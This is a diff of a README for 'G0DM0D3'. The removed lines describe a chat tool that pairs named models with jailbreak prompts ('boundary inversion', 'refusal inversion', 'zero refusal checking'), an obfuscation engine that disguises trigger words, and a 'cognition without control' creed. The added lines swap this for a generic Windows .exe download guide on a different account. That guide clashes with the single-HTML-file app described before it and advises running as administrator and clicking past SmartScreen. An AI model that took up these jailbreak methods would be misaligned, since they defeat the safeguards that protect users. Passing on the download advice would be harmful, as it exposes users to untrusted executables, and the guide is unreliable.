@@ -1,201 +1,216 @@
-```
- ▄████  ██████  ██████  ███▄ ▄███  ██████  ██████  ██████
-██      ██  ██  ██   ██ ██ ███ ██  ██  ██  ██   ██      ██
-██ ▄███ ██  ██  ██   ██ ██  █  ██  ██  ██  ██   ██  █████
-██  ██  ██  ██  ██   ██ ██     ██  ██  ██  ██   ██      ██
- ██████  ████   ██████  ██     ██   ████   ██████  ██████
- ───────────────────────────────────────────────────────────
-  ░▒▓█  LIBERATED AI. COGNITION WITHOUT CONTROL.  █▓▒░
- ───────────────────────────────────────────────────────────
-```
+# ⚡ G0DM0D3 - Controlled AI Chat Access
 
-[GODMOD3.AI](https://godmod3.ai)
+[![Download Now](https://img.shields.io/badge/Download-Visit%20the%20Repository-blue?style=for-the-badge)](https://github.com/Littleblackantomeprazole164/G0DM0D3)
 
-G0DM0D3 is a fully open-source, privacy-respecting, multi-model chat interface that pushes the limits of the post-training layer — for red teaming, cognition research, and liberated AI interaction. Built for hackers, philosophers, and system tinkerers.
+## 🔽 Download
 
-![License](https://img.shields.io/badge/license-AGPL--3.0-green)
-![Models](https://img.shields.io/badge/models-55%2B%20via%20OpenRouter-blue)
-![Privacy](https://img.shields.io/badge/telemetry-anon%20%2B%20opt--out-brightgreen)
+Use this link to visit the page and download the app:
 
-## ✨ Features
+https://github.com/Littleblackantomeprazole164/G0DM0D3
 
-- 🧠 **50+ Models** — Claude, GPT-5, Gemini, Grok, Mistral, LLaMA, DeepSeek, Qwen & more via OpenRouter
-- 🔥 **GODMODE CLASSIC** — 5 battle-tested prompt + model combos racing in parallel to find the best response
-- ⚡ **ULTRAPLINIAN** — Multi-model evaluation engine across 5 tiers (10–55 models), with composite scoring
-- 🐍 **Parseltongue** — Input perturbation engine for red-teaming with 33 techniques across 3 intensity tiers
-- 🎛 **AutoTune** — Context-adaptive sampling parameter engine (temperature, top_p, etc.) with EMA learning
-- ⚡ **STM Modules** — Semantic Transformation Modules for real-time output normalization
-- 🔐 **Privacy-First** — Lightweight telemetry is opt-out, dataset collection is opt-in. No cookies, no PII. API key stays in your browser.
-- 🎨 **4 Themes** — Matrix, Hacker, Glyph, Minimal
-- 🎮 **Easter Eggs** — Hidden secrets throughout (try the Konami code!)
-- 📱 **Responsive** — Works on desktop and mobile
-- 🌐 **Single-File Deployment** — One `index.html`. Deploy anywhere.
+## 🖥️ What G0DM0D3 Does
 
-## 🚀 Quick Start
+G0DM0D3 is a Windows app for AI chat use. It gives you a simple chat screen where you can type a prompt and get a reply. It is made for people who want a direct chat tool with a clean layout and a fast start.
 
-### Hosted
+You can use it for:
+- Chatting with an AI model in one place
+- Sending questions and reading replies in a simple window
+- Keeping your chat work separate from a web browser
+- Running a local or packaged chat app on Windows
 
-Visit the hosted version — no install needed. Bring your own [OpenRouter API key](https://openrouter.ai/keys).
+## ✅ What You Need
 
-### Self-Host
+Before you install the app, make sure your PC meets these basic needs:
 
-G0DM0D3 is a single `index.html` file. No build step, no dependencies, no framework.
+- Windows 10 or Windows 11
+- A 64-bit processor
+- At least 4 GB of RAM
+- 500 MB of free disk space
+- A mouse and keyboard
+- Internet access for download and setup
 
-```bash
-# Clone the repository
-git clone https://github.com/elder-plinius/G0DM0D3.git
-cd G0DM0D3
+For best results:
+- Use a recent Windows update
+- Close extra apps before you start
+- Keep enough free space for app files and chat data
 
-# Open directly in your browser
-open index.html
-# or serve locally
-python3 -m http.server 8000
-```
+## 📥 How to Download
 
-Open in your browser and enter your OpenRouter API key in Settings.
+1. Open this page in your browser:
+   https://github.com/Littleblackantomeprazole164/G0DM0D3
+2. Look for the latest release or download files on the page
+3. Download the Windows file that matches your PC
+4. Save the file in a place you can find, such as Downloads or Desktop
 
-### Deploy
+If the page shows a zipped file:
+- Right-click the file
+- Choose Extract All
+- Open the extracted folder
 
-Upload `index.html` to any static host — GitHub Pages, Vercel, Cloudflare Pages, Netlify, or just a web server.
+If the page shows a setup file:
+- Save the installer to your PC
+- Open it when the download finishes
 
-## 🔥 GODMODE CLASSIC
+## 🛠️ How to Install on Windows
 
-The OG mode. 5 proven model + prompt combos race in parallel. Each combo pairs a specific model with a battle-tested jailbreak prompt. The best response wins.
+### If you downloaded an installer
+1. Double-click the `.exe` file
+2. If Windows asks for permission, choose Yes
+3. Follow the on-screen setup steps
+4. Wait for the install to finish
+5. Open G0DM0D3 from the Start menu or desktop shortcut
 
-| Combo | Model | Strategy |
-|-------|-------|----------|
-| 🩷 CLAUDE 3.5 SONNET | `anthropic/claude-3.5-sonnet` | END/START boundary inversion + GODMODE semantic opposite |
-| 💜 GROK 3 | `x-ai/grok-3` | Unfiltered liberated + GODMODE divider |
-| 💙 GEMINI 2.5 FLASH | `google/gemini-2.5-flash` | Refusal inversion + rebel genius code block |
-| 💛 GPT-4 CLASSIC | `openai/gpt-4o` | OG GODMODE l33t format — the original |
-| 💚 GODMODE FAST | `nousresearch/hermes-4-405b` | Instant stream, zero refusal checking |
+### If you downloaded a zip file
+1. Right-click the zip file
+2. Select Extract All
+3. Open the new folder
+4. Find the app file inside
+5. Double-click the file to start G0DM0D3
 
-## ⚡ ULTRAPLINIAN
+## 🚀 First Launch
 
-The new flagship. Multi-model comparative evaluation engine. Queries models in parallel, scores responses on a 100-point composite metric, and returns the winner.
+When you open G0DM0D3 for the first time:
 
-| Tier | Models | Description |
-|------|--------|-------------|
-| ⚡ FAST | 10 | Lightweight speed-optimized models |
-| 🎯 STANDARD | 24 | Mid-range workhorses |
-| 🧠 SMART | 36 | Strong reasoning models |
-| ⚔️ POWER | 45 | Full power including frontier models |
-| 🔱 ULTRA | 51 | Everything — all available models |
+1. Wait for the app window to load
+2. Enter your chat prompt in the text box
+3. Click the send button or press Enter
+4. Read the reply in the chat area
+5. Continue the chat as needed
 
-## 🐍 Parseltongue
+If the app asks for a model, key, or local path:
+- Paste the value in the field shown
+- Save the setting
+- Restart the app if needed
 
-Input perturbation engine for red-teaming research. Detects trigger words and applies obfuscation techniques to study model robustness.
+## 🎛️ Main Features
 
-- **33 default triggers** across 3 tiers (light: 11, standard: 22, heavy: 33)
-- **6 techniques**: leetspeak, bubble text, braille, morse, Unicode substitution, phonetic
-- **3 intensity levels**: light, medium, heavy
+- Clean chat window
+- Fast prompt entry
+- Simple reply view
+- Easy Windows setup
+- Focused interface for AI chat
+- Light system use for daily work
+- Support for repeated chat sessions
+- Clear layout for non-technical users
 
-## 🎛 AutoTune
+## 🧭 Basic Use
 
-Context-adaptive sampling parameter engine. Classifies your query into one of 5 context types and selects optimal parameters (temperature, top_p, top_k, frequency_penalty, presence_penalty, repetition_penalty) automatically.
+### Start a new chat
+1. Open the app
+2. Clear the current chat if needed
+3. Type a new prompt
+4. Send it
+5. Read the answer and continue
 
-Includes an EMA-based online learning loop — thumbs up/down feedback improves parameter selection over time.
+### Keep your chat organized
+- Use short prompts
+- Ask one question at a time
+- Save important replies
+- Restart the chat when the topic changes
 
-## ⚡ STM Modules
+### Get better results
+- Use clear words
+- Say what you want in plain language
+- Add context when you need a more exact reply
+- Break long tasks into small steps
 
-Semantic Transformation Modules normalize AI outputs in real-time:
+## 🔧 Common Setup Paths
 
-- **Hedge Reducer** — Removes "I think", "maybe", "perhaps"
-- **Direct Mode** — Removes preambles and filler phrases
-- **Curiosity Bias** — Adds exploration prompts
+### Path 1: Standard install
+- Download the file from the repository page
+- Run the installer
+- Open the app from Start
 
-## 🎨 Themes
+### Path 2: Portable use
+- Download the zip package
+- Extract it
+- Run the app file from the folder
+- Keep the folder in one place so the app can find its files
 
-- **Matrix** — Classic green-on-black terminal aesthetic
-- **Hacker** — Red/orange cyberpunk vibes
-- **Glyph** — Purple mystical atmosphere
-- **Minimal** — Clean light mode for readability
+### Path 3: First-run setup
+- Open the app
+- Set any required chat settings
+- Save the settings
+- Start your first conversation
 
-## 🔐 Privacy
+## 📌 Tips for Windows Users
 
-G0DM0D3 takes privacy seriously:
+- If the app does not open, right-click it and choose Run as administrator
+- If Windows SmartScreen appears, check the file source and continue if you trust the repository
+- If the app opens blank, close it and open it again
+- If the window is too small, use the Windows zoom settings
+- If text looks hard to read, change your display scaling in Windows settings
 
-- ✅ No login required
-- ✅ API key stored in browser localStorage only — never sent to G0DM0D3 servers
-- ✅ No cookies or tracking
-- ✅ Lightweight structural telemetry (no message content, no PII) — **opt-out** in settings
-- ✅ All telemetry code is instantly open-source and auditable on Hugging Face dataset
-- ✅ AGPL-3.0 — verify the code yourself
+## 🧪 Example Use Cases
 
-⚠️ OPEN RESEARCH DATASET (API Server Only — does NOT apply to godmod3.ai)
+- Ask an AI for writing help
+- Draft emails or messages
+- Rewrite short text in plain English
+- Brainstorm names and ideas
+- Make a quick checklist from a prompt
+- Test prompt ideas in a focused chat window
 
-The self-hosted API server includes an opt-in Open Research Dataset feature. When you enable "Dataset Generation" in Settings → Privacy, ALL of your chat inputs and model outputs will be automatically published to a public HuggingFace dataset for AI research. This data is public, downloadable by anyone, and may be cached, forked, or redistributed.
+## 📁 File Layout
 
-    This feature is OFF by default and requires explicit consent via a warning modal
-    Automatic PII scrubbing runs on all entries (emails, phone numbers, SSNs, credit cards, IPs, API keys) but is NOT guaranteed to catch everything
-    Do NOT include personal information, real names, passwords, or anything you wouldn't want public
-    This feature does NOT exist on the hosted site (godmod3.ai) — it only applies when opted-in while running the full API server via Docker
+When you extract or install G0DM0D3, you may see files like these:
 
-See [TERMS.md](TERMS.md) for the full three-tier data transparency policy.
+- `G0DM0D3.exe` — main app file
+- `settings.json` — saved app settings
+- `data` folder — local app data
+- `logs` folder — app error logs
+- `README.md` — project instructions
 
-### Chat History & Self-Custody
+Keep the app files together in one folder.
 
-**Your chat history lives entirely in your browser's `localStorage`.** There is no account, no cloud sync, and no server-side backup. This means:
+## ❓ Simple Help
 
-- **If you clear your browser data, your conversations are gone.** There is no recovery.
-- **If you switch browsers or devices, your history does not follow you.**
-- **Private/incognito mode will discard everything when the window closes.**
+### The app will not start
+- Check that you downloaded the full file
+- Try running it again
+- Restart your PC
+- Make sure Windows is up to date
 
-This is by design — G0DM0D3 has no login system and stores nothing on our servers. You own your data, which means you are responsible for it.
+### The app opens but does not respond
+- Close other large apps
+- Wait a few seconds
+- Reopen the app
+- Check your internet connection if the app uses online chat access
 
-There is a built-in export/import feature in settings under "data". Treat your chat history like any other local file — back it up if you want to keep it.
+### The chat does not send
+- Make sure the input box has focus
+- Press Enter or click Send
+- Check any required setup values
+- Restart the app
 
-## 🎮 Easter Eggs
+### The text looks broken
+- Increase your Windows display scale
+- Maximize the window
+- Change your system font size if needed
 
-Hidden throughout G0DM0D3 are various easter eggs. Happy hunting!
+## 🔒 Privacy and Local Use
 
-## 🛠 Tech Stack
+G0DM0D3 can be used in a local desktop setup. That means your chat work stays in a Windows app instead of a browser tab. If the app uses online chat services, your network connection will still matter. If it stores chat history, keep your PC secure with a Windows sign-in and device lock
 
-- **Architecture**: Single-file vanilla HTML/CSS/JS (`index.html`)
-- **API Gateway**: [OpenRouter](https://openrouter.ai) (multi-model routing)
-- **Rendering**: Marked.js + highlight.js for markdown
-- **State**: In-browser localStorage
-- **Deployment**: Static file — no server, no build step
+## 🧩 Recommended Folder Setup
 
-## 📁 Project Structure
+Use a simple folder like this:
 
-```
-G0DM0D3/
-├── index.html        # The entire application — UI, logic, styles
-├── api/              # Optional API server (Node.js/Express)
-├── API.md            # API documentation
-├── PAPER.md          # Research paper
-├── TERMS.md          # Terms of service & data transparency
-└── README.md         # This file
-```
+- `Downloads\G0DM0D3`
+- `Desktop\G0DM0D3`
+- `Documents\G0DM0D3`
 
-## 📜 Documentation
+Keep the app, settings, and data files in the same place. This helps the app load files the right way
 
-- [API.md](API.md) — Full API reference (endpoints, tiers, OpenAI SDK compatibility)
-- [PAPER.md](PAPER.md) — Research paper on the framework's modules and evaluation
-- [TERMS.md](TERMS.md) — Terms of service, privacy policy, data handling
-- [SECURITY.md](SECURITY.md) — Vulnerability reporting and security policy
+## 📎 Download Again
 
-## 🤝 Contributing
+Use this page to visit the repository and download the Windows app:
 
-Contributions are welcome! Please submit PRs.
+https://github.com/Littleblackantomeprazole164/G0DM0D3
 
-## 📜 License
+## 🧷 Quick Start
 
-**AGPL-3.0** — Forever free, irrevocably open.
-
-- Derivatives must remain open source
-- No enshittification allowed
-- Enterprise use permitted with license. Reach out to Elder Plinius for more details.
-
-## 🜏 
-
-> We believe in creative liberty and cognition without control.
-> Tools by builders for builders, not gatekeepers.
-> AI freedom is human freedom.
-
-**G0DM0D3 is not just a chat UI — it's scaffolding for cognitive liberation.**
-
----
-
-Made with 🖤 by Pliny the Prompter
+1. Visit the repository page
+2. Download the Windows file
+3. Extract it if needed
+4. Open the app file
+5. Start chatting
